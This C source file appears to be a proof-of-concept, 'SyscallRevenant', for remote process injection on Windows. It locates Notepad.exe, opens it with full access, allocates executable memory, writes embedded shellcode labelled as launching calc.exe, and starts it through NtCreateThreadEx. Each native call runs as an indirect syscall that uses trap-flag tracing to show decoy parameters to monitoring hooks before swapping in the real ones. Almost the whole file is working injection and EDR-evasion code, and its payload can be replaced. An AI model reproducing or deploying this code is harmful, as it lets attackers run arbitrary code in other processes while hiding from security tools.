#include "_wn64.h"
#include "_rvnt.h"

// Indirect Syscalls with SyscallRevenant.
//
// This is a proof-of-concept that combines trap-flag
// tracing, indirect syscalls, return address spoofing,
// and parameter tampering. It explores the gap between
// a function's entry and the operation that actually
// reaches the kernel.
// 
//             .dS$$SS$b,.
//          .d$S$$”    `‘”kb:,
//        .d7’  ‘S;.       “3i:
//       .?”   .7, “j,     d$i;.
//       ?i    7’ ; ,3$SssS$$I;.
//        ;,..d$ssS$S$$SSS$7., .
//       ;$Sii;;S.;,;,;.S7,. ., .
//       ‘,,’,i”’’ . ..‘d.,.,,..
//         k,.i’‘ ‘      “k.,,,.
//          k.;b          :i;,;’
//           ‘ki,          ki;i,
//            `ki.         I;ii.
//             `k;,.. ,., .iI:I;.
//               `ki:. .. ;7$;;’;.
//                 ‘k’;’;;7?;::.;.. 
//                   ‘aiI;;:.;..
// 

UCHAR REVENANT[] =
        "In  computing,  a  system  call  (syscall)  is  the"
        "programmatic  way  in   which  a  computer  program"
        "requests  a service  from  the operating system  on"
        "which   it   is    executed.   This   may   include"
        "hardware-related services (for example, accessing a"
        "hard disk drive or  accessing the device's camera),"
        "creation  and   execution  of  new  processes,  and"
        "communication with integral kernel services such as"
        "process   scheduling.  System   calls  provide   an"
        "essential  interface  between  a  process  and  the"
        "operating system. In most systems, system calls can"
        "only  be made from  userspace  processes,  while in"
        "some  systems,  OS/360 and successors  for example,"
        "privileged  system code  also issues system  calls.";

// "calc.exe" shellcode.

UCHAR SHELLCODE[162] = {
        0x40, 0x80, 0xE4, 0xF0, 0x41, 0xBB, 0x51, 0x2F, 0xA2,
        0x01, 0x6A, 0x00, 0x48, 0xB9, 0x63, 0x61, 0x6C, 0x63,
        0x2E, 0x65, 0x78, 0x65, 0x51, 0x48, 0x89, 0xE1, 0x48,
        0x83, 0xEC, 0x20, 0x48, 0x83, 0xFC, 0x07, 0xE8, 0x07,
        0x00, 0x00, 0x00, 0x41, 0xBB, 0x56, 0x13, 0xEC, 0x6D,
        0x51, 0x65, 0x48, 0x8B, 0x14, 0x25, 0x60, 0x00, 0x00,
        0x00, 0x48, 0x8B, 0x52, 0x18, 0x48, 0x8B, 0x52, 0x30,
        0x74, 0x06, 0x48, 0x8B, 0x12, 0x48, 0x8B, 0x12, 0x48,
        0x8B, 0x52, 0x10, 0x8B, 0x6A, 0x3C, 0x48, 0x01, 0xD5,
        0x8B, 0xAD, 0x88, 0x00, 0x00, 0x00, 0x48, 0x01, 0xD5,
        0x44, 0x8B, 0x45, 0x18, 0x44, 0x8B, 0x4D, 0x20, 0x49,
        0x01, 0xD1, 0x49, 0xFF, 0xC8, 0x43, 0x8B, 0x34, 0x81,
        0x48, 0x01, 0xD6, 0x48, 0x31, 0xC0, 0x4D, 0x31, 0xD2,
        0xAC, 0x3C, 0x00, 0x74, 0x09, 0x41, 0xC1, 0xCA, 0x07,
        0x41, 0x01, 0xC2, 0xEB, 0xF2, 0x45, 0x39, 0xDA, 0x75,
        0xDD, 0x8B, 0x45, 0x24, 0x48, 0x01, 0xD0, 0x66, 0x46,
        0x8B, 0x04, 0x40, 0x8B, 0x45, 0x1C, 0x48, 0x01, 0xD0,
        0x42, 0x8B, 0x04, 0x80, 0x48, 0x01, 0xD0, 0xFF, 0xE0
};

INT COMPARE(CONST WCHAR* U1, CONST WCHAR* U2) {
        if (!U1 || !U2)
                return -1;

        USHORT A = 1, B = 1;

        while ((A && B) && (A == B)) {
                A = *U1++;
                B = *U2++;
        }
        return A - B;
}

HANDLE GET_PROCESS_ID(WCHAR* PROCESS_NAME) {
        // 
        // Viewing processes requires a query of system
        // information. Parse the query, find the desired
        // process name, save the ID.
        // NtQuerySystemInformation requires 4 parameters.
        //
        // RCX                  => Query type.
        // RDX                  => Buffer to write too.
        // R8                   => Size of buffer.
        // R9                   => Expected size of buffer.
        //
        // You can leave buffer and size empty, but you
        // will need to supply a pointer to an 8 byte
        // field to receive the "expected size".
        // 
        ULONG SIZE;
        SYSTEM_PROCESS_INFORMATION* P_SYS_PROC_INFO;

        SET_FUNCTION(
                ROR7_32__NTDLL,
                ROR7_32__NtQuerySystemInformation
        );
        TRAP_SYSCALL(
                GetRandom(),
                GetRandom(),
                GetRandom(),
                GetRandom()
        );
        if (NT_SUCCESS(RUN_SYSCALL(
                5,
                0,
                0,
                &SIZE
        )))
                return 0;

        if (!(P_SYS_PROC_INFO = (SYSTEM_PROCESS_INFORMATION*)RtlAllocateHeap(NtGetProcessHeap(), HEAP_ZERO_MEMORY, SIZE)))
                return 0;

        SET_FUNCTION(
                ROR7_32__NTDLL,
                ROR7_32__NtQuerySystemInformation
        );
        TRAP_SYSCALL(
                GetRandom(),
                GetRandom(),
                GetRandom(),
                GetRandom()
        );
        if (!NT_SUCCESS(RUN_SYSCALL(
                5,
                P_SYS_PROC_INFO,
                SIZE,
                &SIZE
        )))
                return 0;

        while (COMPARE(PROCESS_NAME, P_SYS_PROC_INFO->ImageName.Buffer)) {
                if (!P_SYS_PROC_INFO->NextEntryOffset)
                        return 0;

                P_SYS_PROC_INFO = (SYSTEM_PROCESS_INFORMATION*)(((CHAR*)P_SYS_PROC_INFO) + P_SYS_PROC_INFO->NextEntryOffset);
        }
        return P_SYS_PROC_INFO->UniqueProcessId;
}

// 
// Windows ABI follows a standard calling convention.
//
// RCX                          => 1st parameter
// RDX                          => 2nd parameter
// R8                           => 3rd parameter
// R9                           => 4th parameter
// [RSP + 0x20]                 => 5th parameter
// [RSP + 0x28]                 => 6th parameter
// ...
// [RSP + 0x00 .. 0x18] Belong to the functions
// being called. This stack space is used to save
// any arguments that as may need be.
// 
VOID main() {
        RtlAddVectoredExceptionHandler(
                1,
                VectoredExceptionHandler
        );

        // 
        // NtOpenProcess requires 4 parameters.
        //
        // RCX                  => Pointer to handle.
        // RDX                  => Access mask.
        // R8                   => Pointer to Object Attributes
        // R9                   => Pointer to Client ID.
        // 
        HANDLE  PROCESS;
        HANDLE  THREAD;
        HANDLE  PROCESS_ID      = GET_PROCESS_ID(L"Notepad.exe");
        VOID* INJECT            = NULL;
        ULONG_PTR SIZE          = sizeof(SHELLCODE);

        OBJECT_ATTRIBUTES* P_OBJECT_ATTRIBUTES;
        CLIENT_ID* P_CLIENT_ID;

        if (!(P_OBJECT_ATTRIBUTES = (OBJECT_ATTRIBUTES*)RtlAllocateHeap(NtGetProcessHeap(), HEAP_ZERO_MEMORY, sizeof(OBJECT_ATTRIBUTES))))
                goto END;

        if (!(P_CLIENT_ID = (CLIENT_ID*)RtlAllocateHeap(NtGetProcessHeap(), HEAP_ZERO_MEMORY, sizeof(CLIENT_ID))))
                goto END;

        P_OBJECT_ATTRIBUTES->Length = sizeof(OBJECT_ATTRIBUTES);
        P_CLIENT_ID->UniqueProcess = PROCESS_ID;

        SET_FUNCTION(
                ROR7_32__NTDLL,
                ROR7_32__NtOpenProcess
        );
        TRAP_SYSCALL(
                NULL,
                PROCESS_ALL_ACCESS,
                NULL,
                NULL
        );
        if (!NT_SUCCESS(RUN_SYSCALL(
                &PROCESS,
                PROCESS_ALL_ACCESS,
                P_OBJECT_ATTRIBUTES,
                P_CLIENT_ID
        )))
                goto END;

        // 
        // NtAllocateVirtualMemory requires 6 parameters.
        //
        // RCX                  => Process handle.
        // RDX                  => Pointer to address.
        // R8                   => Zero bits.
        // R9                   => Pointer to size.
        // [RSP + 0x20]         => Memory mode.
        // [RSP + 0x28]         => Page mode.
        //
        // An important note: when allocating memory, the
        // OS will allocate according to PAGE. The return
        // address will be a new one on the start of this
        // said PAGE. If the address is already know, you
        // must respecify the address when writing memory.
        // 
        SET_FUNCTION(
                ROR7_32__NTDLL,
                ROR7_32__NtAllocateVirtualMemory
        );
        TRAP_SYSCALL(
                NtCurrentProcess(),
                NULL,
                NULL,
                4096,
                MEM_COMMIT,
                PAGE_READWRITE
        );
        if (!NT_SUCCESS(RUN_SYSCALL(
                PROCESS,
                &INJECT,
                NULL,
                &SIZE,
                MEM_COMMIT,
                PAGE_EXECUTE_READWRITE
        )))
                goto END;

        // 
        // NtWriteVirtualMemory requires 5 parameters.
        //
        // RCX                  => Process handle.
        // RDX                  => Pointer to address.
        // R8                   => Pointer to memory to copy.
        // R9                   => Length of memory to copy.
        // [RSP + 0x20]         => Pointer to bytes copied.
        // 
        SET_FUNCTION(
                ROR7_32__NTDLL,
                ROR7_32__NtWriteVirtualMemory
        );
        TRAP_SYSCALL(
                NtCurrentProcess(),
                NULL,
                NULL,
                NULL,
                NULL
        );
        if (!NT_SUCCESS(RUN_SYSCALL(
                PROCESS,
                INJECT,
                SHELLCODE,
                sizeof(SHELLCODE),
                &SIZE
        )))
                goto END;

        // 
        // NtCreateThreadEx requires 11 parameters.
        //
        // RCX                  => Pointer to thread handle.
        // RDX                  => Thread access.
        // R8                   => Pointer to object attributes
        // R9                   => Process handle.
        // [RSP + 0x20]         => Pointer to memory region.
        // [RSP + 0x28]         => Arguments.
        // [RSP + 0x30]         => Creation flags.
        // [RSP + 0x38]         => Zero bits.
        // [RSP + 0x40]         => Stack size.
        // [RSP + 0x48]         => Max stack size.
        // [RSP + 0x50]         => Attribute list.
        // 
        SET_FUNCTION(
                ROR7_32__NTDLL,
                ROR7_32__NtCreateThreadEx
        );
        TRAP_SYSCALL(
                NULL,
                THREAD_ALL_ACCESS,
                NULL,
                NtCurrentProcess(),
                GetRandom(),
                GetRandom(),
                GetRandom(),
                GetRandom(),
                GetRandom(),
                GetRandom(),
                GetRandom()
        );
        if (!NT_SUCCESS(RUN_SYSCALL(
                &THREAD,
                THREAD_ALL_ACCESS,
                NULL,
                PROCESS,
                INJECT,
                NULL,
                FALSE,
                NULL,
                NULL,
                NULL,
                NULL
        )))
                goto END;
END:
        if (P_OBJECT_ATTRIBUTES)
                RtlFreeHeap(NtGetProcessHeap(), 0, P_OBJECT_ATTRIBUTES);

        if (P_CLIENT_ID)
                RtlFreeHeap(NtGetProcessHeap(), 0, P_CLIENT_ID);

        // 
        // NtTerminateProcess requires 2 parameters.
        //
        // RCX                  => Process handle.
        // RDX                  => Return code.
        // 
        SET_FUNCTION(
                ROR7_32__NTDLL,
                ROR7_32__NtExitProcess
        );
        TRAP_SYSCALL(
                NtCurrentProcess(),
                ZERO
        );
        if (!NT_SUCCESS(RUN_SYSCALL(
                NtCurrentProcess(),
                ZERO
        )))
                return;
}